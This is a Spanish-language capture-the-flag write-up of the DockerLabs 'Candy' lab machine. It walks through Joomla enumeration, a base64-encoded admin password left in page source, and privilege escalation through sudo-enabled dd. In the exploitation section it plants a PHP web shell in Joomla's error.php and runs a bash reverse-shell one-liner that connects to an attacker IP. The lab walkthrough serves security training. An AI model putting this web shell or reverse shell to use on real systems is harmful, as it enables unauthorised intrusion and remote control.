La máquina Candy de la plataforma DockerLabs.es, es de dificultad "Fácil", y nos muestra/enseña como un gestor de contenido (CMS), llamado Joomla, puede darnos acceso a la máquina víctima logrando editar uno de sus archivos .php de configuración . .   

# CANDY

## 🚀 DESPLIEGUE DE MÁQUINA

Una vez descargado el archivo .zip de la plataforma dockerlabs.es, se descomprime con el comando unzip y se despliega de la siguiente manera:

<img width="1163" height="530" alt="candy1" src="https://github.com/user-attachments/assets/e85b87eb-38e8-477c-b03f-2545e25f0fae" />

## 🔎 ENUMERACIÓN

Una vez que ya tenemos la ip de la máquina víctima, procederemos a realizar un escaneo con la herramienta nmap, que nos muestre todos los puertos abiertos exístentes para así lograr acceso a la máquina, esto con el siguiente comando, una vez ejecutado, nos damos cuenta que solamente exíste el puerto 80 expuesto, correspondiente al servicio HTTP.

<img width="1148" height="516" alt="candy2" src="https://github.com/user-attachments/assets/0f7b80a8-0606-421f-ae93-e67e40b020f4" />

Ya sabemos que exíste el puerto 80 abierto, por lo tanto, procederemos nuevamente a realizar un escaneo más exhaustivo con nmap, esta vez, indicandole a nmap que nos enumere la versión de dicho servicio HTTP, a su vez, tambien indicandole que nos arroje un conjunto básico de scripts de reconocimiento, ya ejecutado podemos visualizar que nos encontró un directorio llamado /un_caramelo, que no es común, por lo tanto, nos genera sospecha, tambien nos muestra que exíste el archivo robots.txt expuesto, que tambien puede contener directorios sensibles, además, nos muestra que estamos frente a un gestor de contenido (CMS), llamado Joomla.

<img width="1060" height="637" alt="candy3 1" src="https://github.com/user-attachments/assets/0e3a8490-4707-4694-ab7c-ac2849f0c7e3" />

Ya en este punto, iremos a verificar la web, vemos el típico login de Joomla, como no tenemos credenciales válidas, nos dirigeremos al directorio /un_caramelo, daremos CTRL + U para exáminar el código fuente, y nos encontramos con la password del usuario admin expuesta, pero codificada en base64.

<img width="1227" height="627" alt="candy4" src="https://github.com/user-attachments/assets/dd77e8e5-720f-4fdc-a70b-f4b489c939dd" />

<img width="1227" height="627" alt="candy5" src="https://github.com/user-attachments/assets/c862367c-2d02-438d-b17c-5280c1f68157" />

<img width="1227" height="627" alt="candy6" src="https://github.com/user-attachments/assets/42e2742e-a8f0-4383-a015-cfb0bdd30e13" />


Por terminal daremos el siguiente comando, que nos permitirá decodificar la password de admin.

```bash
echo "c2FubHVpczEyMzQ1" | base64 -d;echo
```
<img width="560" height="277" alt="candy7" src="https://github.com/user-attachments/assets/a8f55653-98a2-43a5-bb38-e48918bd9de6" />

Una vez ya tenemos la password de admin, nos loguearemos en el panel de Joomla, pero esta vez en el directorio /administrator para acceder de una vez al dashboard de administrador, luego nos dirigiremos a System > Administrator Templates > Atum, para intentar modificar algun archivo del CMS y poder inyectarle código malicioso.

<img width="1210" height="619" alt="candy8" src="https://github.com/user-attachments/assets/33928044-a4dc-4e14-b158-cc96199f9abe" />

<img width="1210" height="619" alt="candy9" src="https://github.com/user-attachments/assets/dc0dc793-bc8e-48a2-a460-e86b5af54e16" />

## 💣 EXPLOTACIÓN

Encontramos un archivo llamado error.php, del cual nos aprovecharemos para invocar el parámetro "cmd" y lograr ejecutar comandos a nivel de sistema, colandole lo siguiente:

```bash
if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
```

<img width="1210" height="619" alt="candy10" src="https://github.com/user-attachments/assets/0483b2af-d85a-4988-ab99-66e5789a8bfc" />

Le damos a guardar y probamos inyectar un "id" en la url, nos devuelve el usuario por defecto de la máquina víctima, ¡en este punto logramos ejecutar comandos a nivel de sistema!

<img width="829" height="316" alt="candy11" src="https://github.com/user-attachments/assets/ac408379-28ff-40b7-a6a5-abea600f4d2a" />

Desde nuestra terminal, nos ponemos en escucha con netcat por el puerto 443 y nos lanzamos el típico oneliner de reverse shell, de la siguiente manera:

```bash
bash -c 'bash -i >%26 /dev/tcp/10.0.2.15/443 0>%261'
```

<img width="829" height="316" alt="candy12" src="https://github.com/user-attachments/assets/4963b87e-3712-4355-8ee6-f151c4b684c6" />

<img width="1019" height="316" alt="candy13" src="https://github.com/user-attachments/assets/a9a7760b-82ad-4f17-8ac5-6ab2b4bc31f7" />

¡Y en este punto ya estamos dentro de la máquina víctima!

<img width="1019" height="316" alt="candy14" src="https://github.com/user-attachments/assets/66d78beb-fc52-4070-84c1-e6f81a23238b" />

Ya en la máquina víctima, procederemos a realizar tratamiento de la TTY, para que tengamos una terminal estable, que podamos ejecutar CTRL + L y se nos limpie la pantalla, que podamos ejecutar CTRL + C y la reverse shell no se caíga, esto lo haremos con los siguientes comandos:

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo;fg
reset xterm
export TERM=xterm && export SHELL=bash
stty rows 50 columns 236
```

## 🔑 ESCALADA DE PRIVILEGIOS

El primer paso para llegar a root, será revisar el archivo /etc/passwd para ver si exísten más usuarios, vemos que exíste el usuario luisillo, ejecutamos sudo -l para ver si tenemos privilegios a nivel de sudoers, pero nada, en este punto nos ponemos a revisar directorios básicos como /tmp /opt /var, y dentro del último encontramos un archivo crítico, donde exponen la password del usuario luisillo.

<img width="1170" height="613" alt="candy15" src="https://github.com/user-attachments/assets/7465c28c-115f-45b0-8acd-3a5e1c5def31" />

<img width="1170" height="633" alt="candy16" src="https://github.com/user-attachments/assets/6f9fa48c-47eb-4990-bd0b-3fdf88772f81" />

<img width="1170" height="633" alt="candy17" src="https://github.com/user-attachments/assets/d6398985-eba1-473f-998d-d8da39ee827a" />

Nos convertimos en luisillo y ejecutamos sudo -l y vemos que podemos ejecutar el binario /bin/dd como root, nos dirigiremos a la web gtfobins.org para buscar comandos de dicho binario y encontramos que podemos escribir archivos y leer archivos.

<img width="1036" height="291" alt="candy18" src="https://github.com/user-attachments/assets/72b3ad07-70a8-433b-9f2d-c3f7f9119db7" />

<img width="1213" height="626" alt="candy19" src="https://github.com/user-attachments/assets/9398dea2-20ae-4a74-a5d2-50fd67687793" />

Lo primero que se ocurre es indicarle al archivo /etc/sudoers que nos de privilegios para subir a root sin usar contraseña, esto de la siguiente manera:

<img width="1051" height="245" alt="candy20" src="https://github.com/user-attachments/assets/d3068ba4-9171-4fff-881f-d1c2c4420ba4" />

¡Ya somos root!, máquina hackeada.-

